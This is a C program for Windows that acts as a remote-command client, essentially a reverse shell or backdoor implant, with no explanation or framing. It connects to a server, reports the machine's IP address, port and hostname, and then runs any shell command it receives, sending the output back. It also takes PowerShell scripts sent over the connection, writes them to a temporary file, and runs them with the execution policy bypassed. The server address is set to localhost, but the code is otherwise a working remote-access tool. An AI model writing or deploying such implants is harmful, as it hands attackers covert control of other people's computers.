#include <stdio.h>          
#include <stdlib.h>        
#include <string.h>         
#include <winsock2.h>       
#include <windows.h>        
#include <fcntl.h>         

#pragma comment(lib, "ws2_32.lib")  

#define BUFFER_SIZE 4096   
#define COMMAND_DELIMITER ";;;"  

void create_socket(SOCKET *client_socket) {
    *client_socket = socket(AF_INET, SOCK_STREAM, 0);  
    if (*client_socket == INVALID_SOCKET) { 
        fprintf(stderr, "Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();  
        exit(EXIT_FAILURE);  
    }
}

void connect_to_server(SOCKET client_socket) {
    struct sockaddr_in server_addr;  
    server_addr.sin_family = AF_INET;  
    server_addr.sin_port = htons(8081);  
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");  
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Connection to server failed. Error Code: %d\n", WSAGetLastError());
        closesocket(client_socket);  
        WSACleanup();
        exit(EXIT_FAILURE);  
    }
    
    char client_ip[16];  
    int client_port;  
    getsockname(client_socket, (struct sockaddr *)&server_addr, &(int){sizeof(server_addr)});
    strcpy(client_ip, inet_ntoa(server_addr.sin_addr));
    client_port = ntohs(server_addr.sin_port);
    char hostname[MAX_PATH]; 
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
    char flags[BUFFER_SIZE];
    snprintf(flags, sizeof(flags), "IP_ADDRESS**%s**PORT_NUMBER**%d**HOSTNAME**%s", client_ip, client_port, hostname);
    send(client_socket, flags, strlen(flags), 0); 
}

void execute_script(const char *script) {
    char temp_script_path[MAX_PATH];  
    GetTempPathA(MAX_PATH, temp_script_path);  
    strcat(temp_script_path, "temp_script.ps1");  //
    FILE *file = fopen(temp_script_path, "w"); 
    if (file == NULL) {  
        perror("Failed to create temporary script file");
        return; 
    }
    fputs(script, file); 
    fclose(file);  
    char command[MAX_PATH + 50];
    sprintf(command, "powershell.exe -ExecutionPolicy Bypass -File \"%s\"", temp_script_path);
    system(command);  
    remove(temp_script_path);  
}

void receive_commands(SOCKET client_socket) {
    char buffer[BUFFER_SIZE];  
    char command_buffer[BUFFER_SIZE * 10];  
    memset(command_buffer, 0, sizeof(command_buffer));     
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);  
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);  
        if (bytes_received <= 0) {
            break;
        }        
        buffer[bytes_received] = '\0';
        if (strcmp(buffer, "EXIT") == 0 || strcmp(buffer, "EXIT_SERVER") == 0 || 
            strcmp(buffer, "q") == 0 || strcmp(buffer, "e") == 0 || 
            strcmp(buffer, "quit") == 0) {
            break; 
        }
        if (strncmp(buffer, "EXIT_CLIENT", 11) == 0) {
            break;
        }
        if (strcmp(buffer, "SCRIPT_START") == 0) {
            char script[BUFFER_SIZE * 10] = {0};
            while (1) {
                memset(buffer, 0, BUFFER_SIZE); 
                bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);  
                if (bytes_received <= 0) break;  
                buffer[bytes_received] = '\0'; 
                if (strstr(buffer, "SCRIPT_END") != NULL) { 
                    strncat(script, buffer, bytes_received - strlen("SCRIPT_END")); 
                    break;  
                }
                strncat(script, buffer, bytes_received);  
            }
            execute_script(script);  
            const char *response = "Script executed successfully.";  
            send(client_socket, response, strlen(response), 0); 
            continue;
        }
        printf("Received command: %s\n", buffer);  
        FILE *fp = _popen(buffer, "r");
        if (fp) {  
            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {  
                strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);
            }
            _pclose(fp);
        } else {
            const char *error_response = "Command execution failed."; 
            send(client_socket, error_response, strlen(error_response), 0);  
        }        
        strcat(command_buffer, COMMAND_DELIMITER); 
        send(client_socket, command_buffer, strlen(command_buffer), 0);
        Sleep(2000);  
        memset(command_buffer, 0, sizeof(command_buffer));  
    }    
    closesocket(client_socket); 
}

int main() {
    WSADATA wsaData;
    SOCKET client_socket;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }    
    create_socket(&client_socket);
    connect_to_server(client_socket); 
    receive_commands(client_socket);
    WSACleanup();  
    return EXIT_SUCCESS;  
}
